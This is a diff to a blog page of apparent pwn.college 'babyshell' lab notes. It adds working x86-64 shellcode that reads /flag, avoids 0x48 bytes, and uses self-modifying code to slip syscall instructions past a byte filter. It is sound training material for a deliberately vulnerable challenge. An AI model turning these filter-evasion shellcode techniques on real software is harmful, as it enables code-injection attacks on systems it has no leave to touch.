@@ -319,7 +319,7 @@
 
 
                 <time class="article-time--reading">
-                    6 minute read
+                    9 minute read
                 </time>
                 <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
@@ -330,7 +330,7 @@
 
 
                 <time class="article-words">
-                    1074 字
+                    1880 字
                 </time>
             </div>
         
@@ -618,6 +618,47 @@
 		data-flex-basis="638px"
 	
 ></p>
+<h2 id="shellcode-injection-common-challenges">Shellcode Injection: Common Challenges</h2>
+<p>①memory access width</p>
+<ul>
+<li>single byte: mov [rax], bl</li>
+<li>2-byte word: mov [rax], bx</li>
+<li>4-byte dword: mov [rax], ebx</li>
+<li>8-byte qword: mov [rax], rbx</li>
+</ul>
+<p>sometimes we should explicitly specify the size to avoid ambiguity. So like</p>
+<ul>
+<li>single byte: mov <strong>BYTE PTR</strong> [rax], bl</li>
+<li>2-byte word: mov <strong>WORD PTR</strong> [rax], bx</li>
+<li>4-byte dword: mov <strong>DWORD PTR</strong> [rax], ebx</li>
+<li>8-byte qword: mov <strong>QWORD PTR</strong> [rax], rbx</li>
+</ul>
+<p>②forbidden byte</p>
+<p><img src="/p/pwncollege_note6/index.assets/image-20230309134015663.png"
+	width="859"
+	height="294"
+	srcset="/p/pwncollege_note6/index.assets/image-20230309134015663_hu0c59540bbc64cc7e0849fdb29bec0d94_79901_480x0_resize_box_3.png 480w, /p/pwncollege_note6/index.assets/image-20230309134015663_hu0c59540bbc64cc7e0849fdb29bec0d94_79901_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="292"
+		data-flex-basis="701px"
+	
+></p>
+<p><img src="/p/pwncollege_note6/index.assets/image-20230309134226499.png"
+	width="1795"
+	height="269"
+	srcset="/p/pwncollege_note6/index.assets/image-20230309134226499_hu5163f60da61d2ebe3b3f7d2f58d3a2ff_130219_480x0_resize_box_3.png 480w, /p/pwncollege_note6/index.assets/image-20230309134226499_hu5163f60da61d2ebe3b3f7d2f58d3a2ff_130219_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="667"
+		data-flex-basis="1601px"
+	
+></p>
+<p><strong>shl: Logical left shift instruction</strong></p>
 <h2 id="babyshell">babyshell</h2>
 <p><strong>code injection</strong>	=&gt; This challenge reads in some bytes, modifies them , and executes them as code! Shellcode will be copied onto the stack and executed. Since the stack location is randomized on every execution, your shellcode will need to be <em>position-independent</em>.</p>
 <p>level1: <strong>Placing shellcode on the stack at 0x123456789abc; Write and execute shellcode to read the flag</strong></p>
@@ -900,7 +941,308 @@ actual functionality of your code begins. When control flow hits any of these in
 </span></span><span class="line"><span class="cl">        .ascii &#34;/flag&#34;
 </span></span></code></pre></td></tr></table>
 </div>
+</div><p>level4: <strong>This challenge requires that your shellcode have no H bytes</strong></p>
+<p>The &ldquo;H bytes&rdquo; is 0x48 in ASCII and we use the command below to dynamically see the variation.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gcc -static -nostdlib -o <span class="m">1</span> 1.s <span class="p">&amp;</span> objcopy --dump-section .text<span class="o">=</span>out <span class="m">1</span> <span class="p">&amp;</span> objdump -M intel -d <span class="m">1</span> <span class="p">|</span> grep <span class="m">48</span>
+</span></span></code></pre></td></tr></table>
 </div>
+</div><p>got:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">  401000:       <span class="m">48</span> <span class="m">31</span> f6                xor    rsi,rsi
+</span></span><span class="line"><span class="cl">  401021:       <span class="m">48</span> <span class="m">89</span> e7                mov    rdi,rsp
+</span></span><span class="line"><span class="cl">  401024:       <span class="m">48</span> <span class="m">31</span> c0                xor    rax,rax
+</span></span><span class="line"><span class="cl">  40102b:       <span class="m">48</span> <span class="m">89</span> c7                mov    rdi,rax
+</span></span><span class="line"><span class="cl">  40102e:       <span class="m">48</span> <span class="m">89</span> e6                mov    rsi,rsp
+</span></span><span class="line"><span class="cl">  401031:       <span class="m">48</span> <span class="m">31</span> d2                xor    rdx,rdx
+</span></span><span class="line"><span class="cl">  401036:       <span class="m">48</span> <span class="m">31</span> c0                xor    rax,rax
+</span></span><span class="line"><span class="cl">  40103b:       <span class="m">48</span> <span class="m">31</span> ff                xor    rdi,rdi
+</span></span><span class="line"><span class="cl">  401041:       <span class="m">48</span> <span class="m">89</span> e6                mov    rsi,rsp
+</span></span><span class="line"><span class="cl">  401044:       <span class="m">48</span> <span class="m">89</span> c2                mov    rdx,rax
+</span></span><span class="line"><span class="cl">  401047:       <span class="m">48</span> <span class="m">31</span> c0                xor    rax,rax
+</span></span><span class="line"><span class="cl">  40104e:       <span class="m">48</span> <span class="m">31</span> c0                xor    rax,rax
+</span></span><span class="line"><span class="cl">  401053:       <span class="m">48</span> <span class="m">31</span> ff                xor    rdi,rdi
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can change the 64bits to 32bits to eliminate the <code>48</code>. Like the <code>xor rsi, rsi</code> , convert it to <code>xor esi, esi</code>. Like the <code>mov rdi, rax</code>, convert it to <code>mov edi, eax</code>.  Finally it looks like this:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">  401020:       <span class="m">48</span> <span class="m">89</span> e7                mov    rdi,rsp
+</span></span><span class="line"><span class="cl">  40102b:       <span class="m">48</span> <span class="m">89</span> e6                mov    rsi,rsp
+</span></span><span class="line"><span class="cl">  40103b:       <span class="m">48</span> <span class="m">89</span> e6                mov    rsi,rsp
+</span></span><span class="line"><span class="cl">  401048:       b0 3c                   mov    al,0x3c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>switch to 32-bit mode(edi, esp) but the command above is not easy to change. If we change <code>mov rdi, rsp</code> to <code>mov edi, esp</code> it will lose something because the address is 64-bit mode.</p>
+<p><strong>figure out:</strong> we can use the r8, r9 as the <strong>intermediate transition</strong> and r8, r9 won&rsquo;t create the <code>48</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.global _start
+</span></span><span class="line"><span class="cl">_start:
+</span></span><span class="line"><span class="cl">.intel_syntax noprefix
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        #open
+</span></span><span class="line"><span class="cl">        xor esi, esi
+</span></span><span class="line"><span class="cl">        #lea rdi, [rip+flag]
+</span></span><span class="line"><span class="cl">        mov byte ptr [rsp], &#39;/&#39;
+</span></span><span class="line"><span class="cl">        mov byte ptr [rsp+1], &#39;f&#39;
+</span></span><span class="line"><span class="cl">        mov byte ptr [rsp+2], &#39;l&#39;
+</span></span><span class="line"><span class="cl">        mov byte ptr [rsp+3], &#39;a&#39;
+</span></span><span class="line"><span class="cl">        mov byte ptr [rsp+4], &#39;g&#39;
+</span></span><span class="line"><span class="cl">        xor cl, cl
+</span></span><span class="line"><span class="cl">        mov byte ptr [rsp+5], cl
+</span></span><span class="line"><span class="cl">        mov r8, rsp
+</span></span><span class="line"><span class="cl">        mov rdi, r8
+</span></span><span class="line"><span class="cl">        #mov rdi, rsp
+</span></span><span class="line"><span class="cl">        #mov byte ptr [rsp+5], &#39;\0&#39;
+</span></span><span class="line"><span class="cl">        xor eax, eax
+</span></span><span class="line"><span class="cl">        mov al, 2
+</span></span><span class="line"><span class="cl">        syscall
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        #read
+</span></span><span class="line"><span class="cl">        mov edi, eax
+</span></span><span class="line"><span class="cl">        mov r8, rsp
+</span></span><span class="line"><span class="cl">        mov rsi, r8
+</span></span><span class="line"><span class="cl">        #mov rsi, rsp
+</span></span><span class="line"><span class="cl">        xor edx, edx
+</span></span><span class="line"><span class="cl">        mov dl, 100
+</span></span><span class="line"><span class="cl">        xor eax, eax
+</span></span><span class="line"><span class="cl">        syscall
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        #write
+</span></span><span class="line"><span class="cl">        xor edi, edi
+</span></span><span class="line"><span class="cl">        mov dil, 1
+</span></span><span class="line"><span class="cl">        mov r8, rsp
+</span></span><span class="line"><span class="cl">        mov rsi, r8
+</span></span><span class="line"><span class="cl">        #mov rsi, rsp
+</span></span><span class="line"><span class="cl">        mov edx, eax
+</span></span><span class="line"><span class="cl">        xor eax, eax
+</span></span><span class="line"><span class="cl">        mov al, 1
+</span></span><span class="line"><span class="cl">        syscall
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        #exit
+</span></span><span class="line"><span class="cl">        xor eax, eax
+</span></span><span class="line"><span class="cl">        mov al, 60
+</span></span><span class="line"><span class="cl">        xor edi, edi
+</span></span><span class="line"><span class="cl">        mov dil, 42
+</span></span><span class="line"><span class="cl">        syscall
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">flag:
+</span></span><span class="line"><span class="cl">        .ascii &#34;/flag&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>level5: <strong>the inputted data cannot contain any form of system call bytes (syscall, sysenter, int)</strong></p>
+<ul>
+<li>This filter works by scanning through the shellcode for the following byte sequences: 0f05 (<code>syscall</code>), 0f34 (<code>sysenter</code>), and 80cd (<code>int</code>). One way to evade this is to have your shellcode modify itself to insert the <code>syscall</code> instructions at runtime.</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">hacker@shellcode-injection-level-5:~/module6/5$ objdump -M intel -d <span class="m">1</span> <span class="p">|</span> grep <span class="s2">&#34;0f 05&#34;</span>
+</span></span><span class="line"><span class="cl">  40102a:       0f <span class="m">05</span>                   syscall 
+</span></span><span class="line"><span class="cl">  40103a:       0f <span class="m">05</span>                   syscall 
+</span></span><span class="line"><span class="cl">  40104d:       0f <span class="m">05</span>                   syscall 
+</span></span><span class="line"><span class="cl">  401058:       0f <span class="m">05</span>                   syscall
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#see how the code works
+</span></span><span class="line"><span class="cl">cat out | strace /challenge/babyshell_level5
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>solution:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.global _start
+</span></span><span class="line"><span class="cl">.intel_syntax noprefix
+</span></span><span class="line"><span class="cl">_start:
+</span></span><span class="line"><span class="cl">        #fix up the syscalls--&gt;significant
+</span></span><span class="line"><span class="cl">        mov byte ptr [rip+syscall1], 0x0f
+</span></span><span class="line"><span class="cl">        mov byte ptr [rip+syscall1+1], 0x05
+</span></span><span class="line"><span class="cl">        mov byte ptr [rip+syscall2], 0x0f
+</span></span><span class="line"><span class="cl">        mov byte ptr [rip+syscall2+1], 0x05
+</span></span><span class="line"><span class="cl">        mov byte ptr [rip+syscall3], 0x0f
+</span></span><span class="line"><span class="cl">        mov byte ptr [rip+syscall3+1], 0x05
+</span></span><span class="line"><span class="cl">        mov byte ptr [rip+syscall4], 0x0f
+</span></span><span class="line"><span class="cl">        mov byte ptr [rip+syscall4+1], 0x05
+</span></span><span class="line"><span class="cl">        #open
+</span></span><span class="line"><span class="cl">        mov rsi, 0
+</span></span><span class="line"><span class="cl">        lea rdi, [rip+flag]
+</span></span><span class="line"><span class="cl">        mov rax, 2
+</span></span><span class="line"><span class="cl">syscall1:
+</span></span><span class="line"><span class="cl">        .byte 0x13
+</span></span><span class="line"><span class="cl">        .byte 0x37
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        #read
+</span></span><span class="line"><span class="cl">        mov rdi, rax
+</span></span><span class="line"><span class="cl">        mov rsi, rsp
+</span></span><span class="line"><span class="cl">        mov rdx, 100
+</span></span><span class="line"><span class="cl">        mov rax, 0
+</span></span><span class="line"><span class="cl">syscall2:
+</span></span><span class="line"><span class="cl">        .byte 0x13
+</span></span><span class="line"><span class="cl">        .byte 0x37
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        #write
+</span></span><span class="line"><span class="cl">        mov rdi, 1
+</span></span><span class="line"><span class="cl">        mov rsi, rsp
+</span></span><span class="line"><span class="cl">        mov rdx, rax
+</span></span><span class="line"><span class="cl">        mov rax, 1
+</span></span><span class="line"><span class="cl">syscall3:
+</span></span><span class="line"><span class="cl">        .byte 0x13
+</span></span><span class="line"><span class="cl">        .byte 0x37
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        #exit
+</span></span><span class="line"><span class="cl">        mov rax, 60
+</span></span><span class="line"><span class="cl">        mov rdi, 42
+</span></span><span class="line"><span class="cl">syscall4:
+</span></span><span class="line"><span class="cl">        .byte 0x13
+</span></span><span class="line"><span class="cl">        .byte 0x37
+</span></span><span class="line"><span class="cl">flag:
+</span></span><span class="line"><span class="cl">        .ascii &#34;/flag&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>level6: <strong>Removing write permissions from first 4096 bytes of shellcode</strong></p>
+<p>In order to get the flag, just directly add 4096 repeats in the front of the level5 code</p>
+
 </section>
 
 
@@ -1117,7 +1459,7 @@ actual functionality of your code begins. When control flow hits any of these in
         
             
         
-        共 16.88k 字 · 共 9篇文章
+        共 17.68k 字 · 共 9篇文章
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
         <br />本站访客数<span id="busuanzi_value_site_uv"></span>人次---
@@ -1314,6 +1656,7 @@ actual functionality of your code begins. When control flow hits any of these in
             <nav id="TableOfContents">
   <ol>
     <li><a href="#shellcode-injection-introduction">Shellcode Injection: Introduction</a></li>
+    <li><a href="#shellcode-injection-common-challenges">Shellcode Injection: Common Challenges</a></li>
     <li><a href="#babyshell">babyshell</a></li>
   </ol>
 </nav>
